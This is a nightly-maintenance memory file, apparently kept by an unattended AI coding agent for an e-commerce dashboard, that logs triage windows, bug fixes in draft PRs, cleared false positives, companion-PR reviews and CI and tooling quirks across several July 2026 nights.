# Nightly maintenance — cross-night memory (LEARNINGS.md)

Long-lived brain for the unattended nightly run. Records false positives (do NOT
re-flag), recurring bug patterns, fixes that worked, and gate/CI gotchas.

## 2026-07-17

### Triage — BIG window: 58 commits `5904498`→`c6a7605`, STORE DESIGNER + QuickBooks operating-P&L dominated; 2 landed bugs fixed → PR #557
Large active window. Landed clusters: **store designer** (brand-new `app/lib/designer/*` subsystem — a Labs conversational store-builder that scrubs model HTML/CSS, nonce's CSP, substitutes catalog data, and PUBLISHES to the public storefront via loader-data: adaffaa8 from-scratch, convert/render/serve/publish, one-shot first build 4eab5af/4c51e79, harden-from-review 88fcdcc/94915be/2156bd1, preview-with-real-product 371a940, inert preview links + coupon popup widget #555/31a5d74/6093934, serve-through-loader-data #553/6d6bfaf, nonce style tag #554, publish-scope #552; migrations `20260716180000_designer_documents`, `20260717040000_designer_publish`, `20260716031500_store_settings_composer_flag`; gated behind a secret footer "composer" flag / Labs), **QuickBooks operating P&L** (new Analytics subtab #549/#550: `analytics/operating-pnl.server.ts`+`.ts`, `dashboard/analytics-access.ts`, route `dashboard.api.analytics-pnl.tsx`, `OperatingPnl.tsx`, `quickbooks/client.server.ts` OAuth refresh-token rotation), **dashboard list-shell uniformity** (#533/#535 Products/Inventory/Collections onto the Orders list shell, #536 row-height, #539/#540 palette+skeleton, #529/#527/#526 orders toolbar), **nav revalidation** (#548 f7a89de avoid loader reloads between screens), **Autopilot live action stream** (#542/#544/#547 + spec docs), **version-skew recovery** (#543), **storefront edit/preview** (#528 retry malformed patch, #530 restore compiled bindings, #531 rebuild on make-store, #532 resolve recipe asset origin, #534 show product descriptions). Fanned out 3 read-only hunters (store-designer · QuickBooks-P&L · storefront-edit/catalog/nav/Autopilot). **2 landed bugs fixed → PR #557** (branch fix/nightly-2026-07-17, commits b8d3c0f + e05af23, draft). Third hunter (storefront/catalog/nav/autopilot) came back CLEAN.

### Companion PR #556 (Mezoh, "Nightly review fixes — 2026-07-17", base == our main c6a7605) — GENUINE, 7 fixes all correct; MISSED our 2 bugs → posted ONE cross-check comment
Reviewed #556's full diff: all 7 fixes correct — (1) `render.server.ts` escapeHtml on `product.image`/`store.logo` (they alone returned raw into `src="..."`, and substitution runs AFTER the scrub so a `"` in a URL could inject markup/meta-refresh past the sanitizer — the nonce CSP still blocks script; genuine attribute-injection on preview + public storefront); (2) `catalog.server.ts:112` variant-rollup `.in()` un-`.range()`-paged past 1000 rows; (3) `edits.ts:57` empty SEARCH → `current.replace("",fn)` PREPENDS instead of whole-file rewrite; (4) `intent.ts:24` font alias `inter` matched as bare substring (winter/center/interior) → word-boundary regex; (5) `dashboard.api.store.tsx:457` best-effort GC in `finally` w/o `.catch` fails a successful generate → dup products; (6) `store-client.ts:85,432` streaming build/edit didn't `redirectToLogin()` on 401; (7) `storefront.collections.$handle.tsx:122` raw handle not `encodeURIComponent`'d. It ALSO listed good found-but-not-fixed QBO items (token rotation on every GET read, `.gte` time-of-day vs QBO-midnight window mismatch, `pending` status unlocking a blank P&L). But #556 MISSED both of our bugs despite reviewing both clusters → posted one concise cross-check comment listing the 2 gaps + linking #557 (precedent: 2026-07-15 comment on #488). **Judge companion PRs by the DIFF; #556 is thorough and correct — do NOT re-triage its 7 fixes as new bugs next night if it merges.**

### Bug #1 fixed — published designer store: EVERY add-to-cart button adds the FIRST product, not the clicked one (live commerce, #556 miss)
`app/lib/designer/` (from `6d6bfaf` serve-through-loader-data). On a published multi-product designer page (home/collection/search) the `{{#products}}` loop emits one `<button class="designer-add-to-cart">` per card (static, produced by `convert.server.ts:83`, no per-product variant id — `productValue()` has no `product.variantId` case). `serve.server.ts:110` then does a **global `/g` replace** stamping a single `data.contextVariantId` (=`products[0].variants[0].id`, serve:81) onto EVERY button; the runtime `CART_SCRIPT` reads `data-variant-id` off the clicked button → cards #2,#3,… all add product #1. PDP is single-product so it's correct there. Per-product variant id WAS available at `toProduct` (serve:48, `p.variants[0]?.id`) but dropped. Fix (commit e05af23, 4 files): optional `variantId?:string|null` on `DesignerStoreData.products` (types.ts), populate in `toProduct` (serve), stamp each card's button with THAT product's variant **at render time inside the `{{#products}}` loop** (render.server.ts — crucial: this also repairs ALREADY-PUBLISHED stored HTML, whereas a convert-time-only fix would only help new documents), and downgrade serve's global stamp to a negative-lookahead `class="designer-add-to-cart"(?![^>]*\bdata-variant-id=)` so it only fills the one loose PDP button render leaves un-stamped. Variant ids are internal uuids/gids (no HTML-escape, matching the existing stamp). Added a render.test.ts regression (2 products → 2 buttons w/ DIFFERENT data-variant-id).
- **Lesson (looped commerce control stamped with a single global value): when a per-item UI control (add-to-cart, per-row action) is emitted inside a repeat loop but its per-item identity is filled by a POST-render global `/g` string-replace, EVERY instance gets the FIRST item's value. Fix at the point the loop still has the item (render-time, per-iteration), and if older persisted output shares the shape, fix it there too so stored pages are repaired without a data migration. Same family as the 2026-07-13 "shared progress counter bleeds onto sibling buttons" — a control that isn't keyed to its own row.**

### Bug #2 fixed — QuickBooks operating-P&L: six `readPaged` window reads have NO `ORDER BY` → silent revenue/COGS skip-or-dupe (money path, #556 miss)
`app/lib/analytics/operating-pnl.server.ts:110-140` `loadProductContributions` (from `9d2c991`). All six `readPaged` builders (orders, imported_order, refund_fact, imported_refund, order_line, imported_order_line) end in `.range(from,to)` with NO `.order(...)`. `readPaged` (`app/lib/db/read-paged.server.ts`) walks `.range()` pages past PostgREST's 1000-row clamp and adds NO ordering itself → Postgres gives no cross-page row-order guarantee → a boundary row reappears or is skipped → corrupts `netRevenueCents`/`cogsCents`/`contributionCents` for any shop >1000 rows in-window, no error surfaced. Sibling `analytics/commerce.server.ts` applies `.order(col).order("id")` on EVERY equivalent read. Fix (commit b8d3c0f, +6/-6): append `.order("id",{ascending:true})` before each `.range()` (every table has a uuid PK `id`; window is summed so a unique per-row total order suffices; `.select` untouched — PostgREST orders by `id` even when unselected, needed for the 2 line reads). No supabase-fake test on this server path (operating-pnl.test.ts tests only pure fns), so no test double changed.
- **Lesson: THIS IS THE RECURRING FAMILY (2026-07-09 ship-cost, 2026-07-11 #434 order/list, 2026-07-08 #396 commerce). Every night a NEW money/analytics module that uses `readPaged`/`fetchAllRows`/`.range()` ships WITHOUT the `.order(id)` tiebreak. On any window that adds a paged analytics reader, grep the new module for `.range(` / `readPaged(` and confirm each carries a stable unique `.order`. `commerce.server.ts` is the reference implementation.**

### False positives cleared / verified CLEAN this run (do NOT re-flag)
- **Store-designer AUTH + CSP + serve path — CLEAN:** `dashboard.api.designer.tsx` (requireSameOrigin+requireDashboardSession, composerEnabled gate, shopId from session), `dashboard.designer.preview.tsx` (requireDashboardSession, `page` whitelisted), and `designer-publish`/`composer-enabled` cases in `dashboard.api.store.tsx` all session-scoped, no tenant-from-body. CSP nonce coherence: same `nonce` feeds `markStorefrontBundleRendered(headers,nonce)` and `page.nonce`; `entry.server.tsx` reads it back for BOTH the CSP header and `<Scripts>`; browse CSP requires nonce for style AND script — matches. Serve returns loader DATA (`json(page)`) with null-fallthrough, NOT a thrown/raw Response → no error-boundary landing. Data-substitution escaping otherwise complete (escapeHtml both quote styles incl `'`; handles `encodeURIComponent`'d; prices via `money()`). Double-scrub (save-time + serve/preview-time). First-build spend gated by `designerHasDocuments` + 1/120s rate-limit + page-by-page persistence (interrupted build resumes via edit path, no full re-run). Publication reads are ≤2 rows (base+route), no paging hazard.
- **QuickBooks cross-shop scoping — CLEAN:** `realmId` from `integration_credentials.external_account_id` scoped by `shop_id`, validated `^\d+$` before path interp; token rotation persist is `.update().eq("shop_id",shopId).eq("kind","quickbooks")` (can't clobber another shop); route uses `session.shopId` only. Cents/dollars consistent (`Math.round(value*100)`); upstream QBO/Supabase errors thrown not swallowed; `allocateOperatingExpenses` remainder-to-last + `netMarginPct` div-by-zero guard correct. (The token-rotation-in-GET race, window-start mismatch, and `pending`-unlock are #556's noted items — architectural, left to maintainer.)
- **storefront-edit / catalog / nav-revalidation / Autopilot-stream / settings — CLEAN (whole hunter):** `restoreKnownBindingSources` route index type-safe; `intent.ts` new `FRESH_BUILD_RE`/`RESET_RE` anchored; `setComposerEnabled` partial upsert does NOT clobber sibling settings cols (PostgREST ON CONFLICT only sets present cols); `catalog.server.ts` MAIN query keeps `.order(sort).order("id").range()` tiebreak + date filter has no inclusive-end off-by-one; `dashboard.$.tsx shouldRevalidate` returns false ONLY on pathname change and the loader carries no user-mutated data (route has no action) → no stale-after-mutation; `version-skew.ts` correctly excludes 401/≥500; `Autopilot.tsx` action-stream busy state keyed per row (`approving===p.alertId`), `actionStreamWindow` Math.min prevents dup React keys. (Known #556 items left untouched as instructed.)

### Found but NOT fixed (below the conservative bar — noted in #557 body for a maintainer call; act on if they recur)
- **Coupon widget `widgets.ts:92`** — `html.replace(MARKER_RE, markup(...))` string replacement embeds model-authored (escaped) coupon copy; `$&`/`` $` ``/`$'`/`$$` sequences get interpreted by String.replace → duplicate page content into the popup. No script injection (values still escaped), low reachability. Trivial hardening = function replacer `() => markup(...)` (same family the codebase uses in edits.ts / render.server.ts:104). Left below-bar.
- **Soft-404 `serve.server.ts:71-82`** — collection/search designer paths don't verify the handle exists (`listProducts`→`[]`), so a garbage handle serves the template HTTP 200 + empty grid; the product path 404s an unknown handle. Non-designer path 404s these. Indexable-URL hygiene, low sev.
- **UTF-8 BOM on `app/lib/storefront-bundle/build.server.ts:1`** — prepended this window (`-import`→`+﻿import`); server-only, tsc/esbuild/Vite strip a leading BOM → no runtime/build effect. Hygiene nit.
- **`isoParam` `dashboard.api.catalog.products._index.tsx:19`** — `Number.isFinite(Date.parse(raw))` accepts `"2026"`/`"2026-07"` → PostgREST 400 (not the 500 the comment guards). Only reachable by hand-crafted query string (UI always sends full ISO), errors only the caller's own list. Validate full-ISO shape if it recurs.

### Gate / environment
- Baseline clean `main` (`c6a7605`) FULLY GREEN before any fix: typecheck 0, and the window added many tests (baseline test count now **7036 passed | 12 skipped | 0 failed**, up from 6947 last night). Both fixers ralph-looped GREEN on the FIRST pass. Fix #2 tree (`b8d3c0f`): setup 0 · typecheck 0 · lint 0 (13 pre-existing warnings in untouched test files) · build 0 (verify-client-bundle **421** client files clean) · test 7036 passed | 0 failed. Fix #1 tree / branch tip (`e05af23`): same gate green, test **7037 passed** (+1 new regression test) | 12 skipped | 0 failed.
- `npm ci` exit 0 (installed ONCE by orchestrator, reused by both sequential fixers). Full suite ~100s. Fixers ran SEQUENTIAL (shared checkout) — QBO first (committed), then designer.
- **CI runner-infra outage STILL present on #557 — SAME billing signature, do NOT re-kick/comment.** Whole `CI` workflow run `29557331284` on `e05af23`: `run_started_at 05:26:44 → updated_at 05:26:49` = **5 seconds** total (far too short for ci+typecheck+lint+build+test); BOTH `Node gate` (87812242431) AND `Python engine tests` (87812242443) `failure` with output summary/text/title ALL `""` (runner never executed); Python co-failed on a PURE-TS diff (impossible from code). Identical to every night since 2026-07-07 (maintainer confirmed #489: GH Actions down all week on a billing failure). Did NOT re-kick (no code change turns runner-infra green), did NOT comment on the CI failure. Vercel preview = Building (deploys fine). Gate locally + trust Vercel. PR #557 auto-subscribed on open — the CI-failure + vercel[bot]-Building webhooks are the expected infra noise.
- `gh` CLI STILL absent — GitHub MCP only. `list_pull_requests state:open minimal_output:true` returned 6 open PRs inline WITHOUT overflowing the tool-result cap this run (#556 new companion, #525 our 2026-07-16 still-open draft, #524 old companion, #489 our 2026-07-15 draft, #395 storegen, #267 RR7) — small enough that the file-overflow workaround wasn't needed. `get_check_run` param is `checkRunId` (camel); `actions_get` uses `resource_id` + `method:"get_workflow_run"`; `add_issue_comment` param is `issue_number` (snake).
- Stop-hook `stop-hook-git-check.sh` fired TWICE while background fixers were mid-edit on the shared checkout — expected; did NOT commit their in-progress files (races the single-commit flow); waited for each completion notification.

## 2026-07-16

### Triage — BIG window: 58 commits `a681466`→`5904498`, store-builder/storefront-AI + orders-redesign dominated; 1 landed bug fixed → PR #525
Large active window. NOTE the maintainer MERGED a batch of old companion nightlies this window — `5f6f328`(#488), `4e51456`(#396), `edb1ea8`(#391) now appear on `main` as merged fixes; they were reviewed the nights they were open → did NOT re-triage them as regressions (they're fixes, not new bugs). Landed clusters: **store-builder/storefront-AI** (design-model picker f6a1b18, rephrased-asset/disabled-imagery 6b74c65, heartbeat gen/edit streams f01d057/9dfcd6a, prompt-blockers #515, preserve-template-HTML #516, harden one-shot #510, publish-to-tenant-URL #513/6e272bc, recipes-default #507, judge hardening f6d16e5/6eb5342/126a131/053221c, focus-rail #517, sidebar-icon #520), **orders redesign** (BIG rewrites: #518 list-family + new OrderListFamily/OrderSubLists, #512 full-fidelity, #519 transparent-modal CSS), **onboarding** (#522 first-run product tour + migration `20260715213610`), **campaigns** (#521 tooltip, #504 image-gen cost control + campaign-draft persistence), **misc** (#506 fail-closed Stripe-demo, #490 Meta-return, c9a7566 Chrome-on-Windows). Fanned out 4 read-only hunters (store-builder/AI-gen · runtime/recipes/checkout · orders-redesign · campaigns/onboarding/misc). **1 landed bug fixed → PR #525** (branch fix/nightly-2026-07-16, commit 0e4fe2b, draft). Three hunters CLEAN.

### Bug #1 fixed — mock `/orders-preview` route shipped to PRODUCTION, unauthenticated (hygiene/exposure, #512)
`app/routes/orders-preview.tsx` (new via `4d771a7`/#512 "Redesign orders full-fidelity dashboard"): a TOP-LEVEL route (`export default OrdersPreview`) rendering a full mock Orders dashboard seeded with fake data, with NO loader, NO `requireDashboardSession`, NO env guard → `https://app.calderyncompany.com/orders-preview` reachable by anyone in prod. Every other preview surface in the repo is nested under `dashboard.*` (auth loader) or an `*.api.preview` route; this one broke convention. The file's own comments + `app/entry.server.tsx:180` (`pathname === "/orders-preview"` streaming special-case) call it "the local Orders preview"/"the dev module" → authored as a LOCAL/dev preview but shipped to prod unguarded. Data is all MOCK so NO real-data leak — exposure/hygiene, and a direct violation of CLAUDE.md's "no dev overlays in production browser bundles" rule. Fix (commit 0e4fe2b, +7 lines): param-less Remix `loader` that throws `new Response("Not Found",{status:404})` when `process.env.NODE_ENV==="production"`, else returns null → unreachable in prod, still renders local/dev (matches author's "local" intent). Left `entry.server.tsx` as-is (its branch is still needed for correct local/dev hydration + is server-side, not a browser artifact).
- **Lesson: on a big UI-redesign PR, grep for NEW top-level routes (`app/routes/*.tsx` not under `dashboard.`/`app.`/`storefront.` and not `*.api.*`) — a "preview"/"mock"/"full-fidelity demo" route added for review routinely ships to prod with no loader/auth. `verify-client-bundle` does NOT catch it (it's a legit route, no dev-bridge markers). Convention here: previews live under an auth-gated parent or an api.preview route; a bare top-level preview route is the smell.**

### Judge surface went DEAD after `a0f2273` (observation, NOT fixed — no lint/correctness impact)
`a0f2273` ("make recipes the default path") removed the visual-judging stage from the generation pipeline → `rankConcepts` / `renderConceptWithMerchantData` / `app/lib/storefront-ai/judge.server.ts` now have NO live callers (grep-confirmed). That makes the SAME-DAY judge-hardening commits (9dfcd6a, e6a717f, f6d16e5, 6eb5342, 126a131, 053221c) effectively dead in the shipping path. NOT a correctness defect and does NOT trip lint (exported module fns, not local unused-vars) → left for a maintainer prune/re-wire call; noted in the #525 body. Don't "fix" this unattended — the team may re-wire judging.

### False positives cleared this run (do NOT re-flag)
- **#504 image-gen cost control — CLEAN (recurring re-spend family):** `build.server.ts:prepareRecipeImages` now reads the override/owned-asset layer via `applyAssetOverrides(shopId, products)` BEFORE deciding what to generate, and caps at `required − existingReady` (≤3/build), all gated behind `geminiImageGenerationEnabled()` (off by default). The cost ledger (`gemini.server.ts`) does reserve→started→complete/release: a call that started stays counted (fails cost-ceiling CLOSED); `releaseImageGen` only frees truly-unstarted reservations (`status='reserved' AND provider_started_at IS NULL`). Gating read goes through the write layer → no forever-respend (the fix family from 2026-07-09 #395 / 2026-07-15 #1 held).
- **#506 Stripe demo/live gating — CLEAN (fails CLOSED):** `connect.server.ts` `platform` route requires `isStripeTestMode() && isDemoShopFresh()`; live/unknown key modes fall through to `{ready:false}`; `isDemoShopFresh` fails toward "real shop" on any read error.
- **#522 product-tour route auth — CLEAN:** `dashboard.api.product-tour.tsx` = `requireSameOrigin` → method check → `requireDashboardSession`; tenant from `session.userId`, never body. Migration `20260715213610` touches only `public.users` (user-scoped), backfills existing users completed. Tour client files import no `.server`. Draft persistence keys on `run_id` via `upsert(onConflict:"shop_id,run_id")` + unique constraint; reserve RPC `pg_advisory_xact_lock`-serialized; replay branch re-persists but does NOT regenerate → no re-spend.
- **#490 Meta return (`auth.meta.$.tsx`) — CLEAN:** try/catch wraps only post-state-consume work; success `redirect()`s are RETURNED not thrown (not swallowed); `safeDashboardOAuthReturnTo` blocks open-redirect; `terminalFallback` unconditionally assigned before its only use.
- **Orders redesign #518/#512 — CLEAN on logic:** filter predicates (OrderSubLists.tsx charges/drafts/abandoned) correctly signed, no inversions; sort comparators apply direction correctly, `compareText` null-safe; pagination start/end/disabled + stranded-offset stepback terminate at 0; "which row is busy" correctly scoped (`recoverySending` is a `Set<orderId>`, `busyReturnId` per-return, `bulkBusy` legitimately whole-selection); all `money()` calls pass the row's own currency; new client route imports only type-only modules, rows DTO-mapped. #519 is CSS-only (`--card-solid`/`--hairline-strong` both defined).
- **Storefront runtime/checkout batch — CLEAN:** nonce hydration (2f34263) coherent end-to-end (bundle-header nonce == `<Scripts>` nonce, policies route gap closed); `appendStorefrontTrackingCookies` (1465215) behavior-identical via `getSetCookie()` w/ split fallback only when absent; `applyStorefrontPatch` does `structuredClone(input)` so per-op re-apply can't mutate base; `cart.count` zero-branch ordered before generic `cart.` branch (real 0, no off-by-one); single-fetch flag dropped + checkout callback reverted to `onShellReady` (typecheck clean).
- **#524 companion (Mezoh, PO hardening, base==our main) — GENUINE, 5 fixes all correct, NO comment posted.** int4 cost cap (2_147_483_647 = int4 max, rejects `>MAX` so boundary still accepted — no off-by-one), rollover-date rejection (all-UTC round-trip, `DATE_RE` anchored), reprojectFromRpc best-effort `.catch` (RPC already committed before reprojection → only the read-model refresh error is swallowed+logged, correct), disabled receive input for null-variant lines (consistent w/ prefill+submit), `po_list` stable-order migration (`create or replace`, byte-identical signature+grants, adds `po.id desc` tiebreak). NOTE #524's BODY is stale/wrong ("no commits in 24h, HEAD f8c7768") but its BASE is current main 5904498 and its DIFF is correct — judge companion PRs by the DIFF, not the body's window claims.

### Gate / environment
- **Baseline is now FULLY GREEN — the 3 atelier-nine `interactive-contract.test.ts` failures documented every night since 2026-07-15 are FIXED** by `71c3611` ("storefront/atelier-nine: restore interactive contracts") this window. Clean-`main`(5904498) baseline: typecheck 0 · lint 0 (13 pre-existing warnings in untouched test files) · **test 6947 passed | 12 skipped | 0 FAILED**. So this night the fixer gate target was 0 failures (no "3 known failures" exception). Fixer final tree (0e4fe2b): setup 0 · typecheck 0 · lint 0 · build 0 (verify-client-bundle: **416** client files clean) · test 6947 passed | 12 skipped | 0 failed.
- `npm ci` exit 0 (installed once by orchestrator, reused by the single fixer). Full test suite ~105s.
- **CI runner-infra outage STILL present on #525 — SAME billing signature, do NOT re-kick/comment.** Node gate 05:21:05→05:21:09 (**4s**), Python engine tests 05:21:05→05:21:08 (**3s**) — both far too short for the real gate; Python job co-failed on a TS-ONLY diff (impossible from code); `Vercel Preview Comments` check = success, Vercel deploy = Building. Identical to every night since 2026-07-07 (maintainer confirmed on #489: GH Actions down all week on a billing failure). Did NOT re-kick (no code change turns it green), did NOT comment. Gate locally + trust Vercel preview. PR #525 auto-subscribed on open.
- `gh` CLI STILL absent — GitHub MCP only. `list_pull_requests state:open` returned only 4 open PRs this run (#524 new companion, #489 our own 2026-07-15 still-open draft, #395 old storegen feature, #267 old RR7) and did NOT overflow the tool-result cap (small set now that the nightly backlog was merged) — so the file-overflow workaround wasn't needed this night.

## 2026-07-15

### Triage — BIG window: 57 commits `be09bcd`→`a681466`, storefront-generation-dominated; 3 landed bugs fixed → PR #489
Large active window. Landed clusters: **storefront-AI generation/compiler** (runtime-one compiler e39fdc3/308ca26, prompt-edit, bounded model output #485/#486, constrain font ids/asset keys/slot markers #478–#484, Higgsfield→Gemini image swap #469), **storefront-edit/runtime/recipes** (edit-scope ancestry + audit replay 154a938, repair patch source #476, recover unscoped repeats #475, stream edits #473, atelier-nine fidelity #471, audit-actor FK migration #470, recipe bundles daily-protocol/companion-field-guide/atelier), **campaign-wizard polish** (#474 huge + #487), **onboarding-nav** (#483). NOTE `4fb99d3` "first-run turn-on delivers (#465)" is OUR OWN 2026-07-14 nightly fix now merged — did NOT re-triage. Fanned out 3 read-only hunters (storefront-ai-gen · storefront-edit/runtime/recipes · campaigns/onboarding). **3 real bugs fixed → PR #489** (branch fix/nightly-2026-07-15, commits aeac643/d8a0865/1e1d56b, draft). Campaigns/onboarding hunter came back CLEAN.

### Companion PR #488 (Mezoh, base==our main a681466) — GENUINE, 5 correct fixes, but INCOMPLETE. Posted ONE cross-check comment.
#488 fixes (verified plausibly correct): (1)(2) storefront-edit/intent.ts reset-intent false-negative + "no template" regex; (3) asset.server.ts failed-run overwrites a ready store_asset row (`ignoreDuplicates: status==="failed"`); (4) first-run.creatives.tsx quota-exhausted branch burned a regeneration (markStarted before provider call); (5) first-run-creatives.server.ts leading/trailing comma in ad copy. #488 DEFERRED the atelier-nine contract regression (correct). **#488 MISSED all 3 of our bugs.** Its gate linted ONLY touched files → it reported lint green and missed the repo-wide lint failure (our bug #3). Posted one concise comment on #488 listing its 3 gaps + linking #489.

### Bug #1 fixed — paid image generation RE-SPENDS on already-generated products (MONEY, #488 miss)
`app/lib/storegen/imagery/asset.server.ts`: `enhanceListing` calls paid Gemini BEFORE any store_asset lookup; `generateMissingListingImages` fans over `products.slice(0,12)` with no dedup; build's `prepareRecipeImages` (build.server.ts:200) reads via `getCatalog()` — NO `applyAssetOverrides` — so an already-generated product stays `images.length===0` → re-generates (re-pays) on every rebuild/retry. #488 fix #3 (ignoreDuplicates on FAILED) stops the failed→ready wipe but NOT the re-spend. Fix: bounded `readReadyAssetIds(shopId, ids)` (`.in("product_id",…)`, shop+source='gemini'+status='ready', throws on error); skip already-ready products before spending + count them toward the returned ready total (satisfies the all-or-nothing imagery gate without re-pay). enhanceListing/gate policy untouched. commit aeac643.
- **Lesson: when the read that GATES a paid per-item loop does NOT go through the override/write layer that stores the generated output, "missing" is permanently true for already-produced items → the loop re-spends forever. Always check the gating read sees the write path's output.** (Same family as 2026-07-09 #395 store-asset re-spend.)

### Bug #2 fixed — scopeRegionCss corrupts pseudo-element selectors (#488 miss)
`app/lib/storefront-edit/patch.server.ts` `scopeRegionCss` (from 154a938): the loop advances past a trailing pseudo-element and `insertAfter`s the region id → `.card::before#<id>` = invalid (nothing may follow a pseudo-element in a compound); browsers silently drop the whole rule → a `replaceRegion` edit touching `::before`/`::after` installs but renders unstyled. postcss-selector-parser does NOT throw on insertAfter. css.ts forbids only `:root`/`:host`/`::part`/`::slotted`, so `::before`/`::after` reach the path. Fix: halt the loop before a trailing pseudo-element (`type==="pseudo" && value.startsWith("::")`) and `insertBefore` when the anchor itself is a pseudo-element → `.card#<id>::before`. Pseudo-CLASSES (single-colon `:hover`) unaffected. commit d8a0865.
- **Lesson: any "append a simple selector to a compound" rewrite must place the addition BEFORE trailing pseudo-elements (`::x`); selector-parser emits the invalid string without error.**

### Bug #3 fixed — landed lint-gate regression: orphaned CampaignCard/DraftCard (#488 miss; breaks CI Node gate)
#487 (5c70ca8) replaced the card layout with `CampaignRow`/`DraftRow` but left `CampaignCard`(494)/`DraftCard`(604) defined-but-unused in `app/components/dashboard/screens/Campaigns.tsx` → `npm run lint` (whole repo) RED on main (2 `no-unused-vars` errors). Verified render intact via the new rows; deleted the 2 dead functions, no cascade. commit 1e1d56b. NOTE the `CampaignCard` at `app/routes/app.campaigns._index.tsx:946` is a SEPARATE symbol in the FROZEN legacy embedded route — untouched.
- **Lesson: run the FULL `npm run lint` (whole repo) as a triage smoke-check on a fresh window — a "polish" PR that swaps a component layout routinely orphans the old sub-components, and the CI-broken environment lets lint-red land on main unnoticed. A companion PR that lints only touched files won't catch it.**

### Gate gotcha — 3 PRE-EXISTING atelier-nine contract failures on main (NOT ours; do NOT chase)
Baseline on clean main a681466: `npm test` = **3 failed | 6836 passed | 12 skipped**. All 3 are in `app/lib/storefront-recipes/interactive-contract.test.ts` (atelier-nine only, from #471 a21a3c5): (1) shell lost `data-cd-platform-content="policyLinks"` footer (moved into the home route only → product/collection/search/cart pages lose the footer + the store's legal policy links = UX/compliance regression), (2) `shell.css` lost `@media (max-width:` responsive rule, (3) `home.css` lost a scroll-system marker (`scroll-snap-type|scroll-behavior|scroll-margin|position:sticky`). REAL regression but DEFERRED — a correct fix restructures the recipe (move footer to shell, restore shell/home CSS) AND regenerates pixel baselines `public/.../atelier-nine/baselines/*.webp`, unsafe unattended; #488 deferred it identically. **Told every fixer verbatim: treat the gate GREEN iff the ONLY failures are those exact 3 AND total passing ≥ baseline — otherwise the ralph-loop never converges and a fixer may wander into the recipe.** After our 2 test-adding fixes: final = 3 failed | 6838 passed | 12 skipped.

### CI runner-infra STILL broken (same signature since 2026-07-07) — did NOT re-kick, did NOT comment
On #489 (1e1d56b): GH-Actions `Node gate` + `Python engine tests` BOTH failed; `get_job_logs return_content=true` → HTTP 404 for BOTH (runner never executed); `get_check_run` Node-gate output summary/text/title all "". Our diff is PURE TypeScript so a Python-engine failure is impossible-from-code → infra, not regression. Local gate fully green; Vercel preview deployed Ready. Did NOT re-kick (no code change turns runner-infra green), did NOT comment (known persistent infra). PR #489 auto-subscribed on open. **ROOT CAUSE now confirmed by the maintainer (2026-07-15, on #489): GitHub Actions is down all week on a BILLING failure — jobs die in ~3s with "recent account payments have failed." It will NOT go green until billing is fixed; do not re-kick, do not wait on CI, gate locally + trust the Vercel preview. Maintainer verified #489 locally and MERGED it (own-PR fixes get merged even while Mezoh companion PRs sit open).**

### Environment / MCP quirks
- `gh` CLI STILL absent — GitHub MCP only. `list_pull_requests` STILL overflows the tool-result cap (~78k across 12 open PRs) → auto-saved to a one-line file; parse with python `json.load` (fields: number/title/user.login/head.ref/updated_at), do NOT Read.
- Param casing traps: `add_issue_comment` → `issue_number` (snake); `get_check_run` → `checkRunId` (camel); `get_job_logs` → `job_id` (snake); `actions_list` requires a `method` param (errors without it).
- `npm ci` exit 0 (Node), reused across all 3 fixers (installed once by orchestrator). Gate scripts: setup=`prisma generate`, typecheck=`tsc --noEmit`, lint=`eslint .` (WHOLE repo), build=`remix vite:build && npm run verify:client-bundle` (verifier: **404** client files clean), test=`vitest run`.
- ALL prior Mezoh nightly PRs (#464/#446/#437/#434/#396/#391/#353/#326) remain OPEN/unmerged — the maintainer is not merging companion nightlies. #488 likely joins them. Bugs living only in those PRs stay live on main → re-derive from the live tree each night (don't assume a companion PR's fix is on main).


## 2026-07-14

### Triage — BIG window: 14 PR merges landed (`d21b782`..`be09bcd`, PRs #446-ish→#463); 1 real bug fixed → PR #465
Large active window since last night's tip `d21b782`. New tip `be09bcd`. Landed clusters: **campaigns** (#447 overhaul, #450 first-run wizard, #452 Meta create/duplicate; NOTE #457 codex/campaign-experience was REVERTED same window by #458 e0b0eff → those 3 commits net to zero, don't triage them), **onboarding journey** (#449 3-phase guided journey + place-a-test-order-with-auto-refund, #451 carrier-count), **product-editor diet** (#453), **payouts-to-prod** (#454), **contact-us** (#455 email delivery), **shipping** (#460 route health map + destination-repair atomic claim + migration `20260713160000` + ingest). `0ec4691` "ship-cost/runner stable id tiebreak (#397)" is OUR OWN 2026-07-09 nightly fix finally merged — do NOT re-triage. Fanned out 4 read-only bug-hunters (campaigns · shipping · journey+payouts · product-editor+contact+misc). **1 real money/ads-path bug fixed → PR #465** (branch `fix/nightly-2026-07-14`, commit `2e9b416`, draft).

### Bug #1 fixed — first-run campaign "Turn on" NEVER delivers or spends (ads/money path, HIGH)
- **`app/lib/meta/campaign-create.server.ts`** `createFirstCampaign` (PRs #450/#452, commits `7db1dd7` + `6c0338e`/`c715839`). Created the Meta campaign **AND ad set AND ad all `PAUSED`**, but the wizard "Turn on" button (`CampaignWizard.tsx`) + row-level resume both fire the `resume_campaign` action, whose Meta adapter (`app/lib/meta/actions.server.ts` `resume()`) posts `status:"ACTIVE"` to the **campaign object ONLY**. On Meta an ad delivers only when campaign AND ad set AND ad are ALL active (effective_status is gated by the whole parent chain). No code path anywhere resumes the ad set/ad → after "Turn on" the campaign shows live but delivers 0 impressions / spends $0 permanently.
- **Fix:** restore the intended "campaign is the single on/off gate" design — keep ONLY the campaign PAUSED (a paused campaign gates all delivery, so nothing spends pre-turn-on), create the **ad set and ad `ACTIVE`**; resuming the campaign then brings the whole funnel live. `createPausedAd` (`ad-create.server.ts`) is a SHARED helper also used by the push-creative-draft path (`execute.server.ts:473`) which INTENTIONALLY wants a paused draft → did NOT hardcode-flip it; added an optional caller-controlled `status?: "ACTIVE"|"PAUSED"` defaulting to `"PAUSED"` (draft path unchanged, injected dep type in execute.server.ts stays assignable since the field is optional), and `createFirstCampaign` passes `status:"ACTIVE"`. Updated `campaign-create.test.ts` (which asserted all-PAUSED — encoded the bug): campaign stays PAUSED, ad set + ad now ACTIVE, blanket "every status write is PAUSED" loop → "campaign is the only PAUSED write".
- **Lesson (multi-level platform object needs a consistent on/off gate):** when a create-flow makes a parent+children hierarchy on an external platform (Meta campaign→adset→ad, or any tree where the child's effective state is gated by the parent), and a separate "activate" action flips ONLY the top object, verify the children were created in the state the single-flip assumes. All-paused-create + parent-only-resume = a permanently dark object that the UI reports as live. Check createFirstCampaign AND (latent, NOT fixed this run — duplicate uses `status_option:"PAUSED"` deep-copy + campaign-only resume too) `duplicate_campaign`'s copies: same shape, lower confidence, left for a maintainer call.

### Companion nightly PR #464 (Mezoh, base == our `main` `be09bcd`) — GENUINE, 6 fixes all correct; posted NO comment
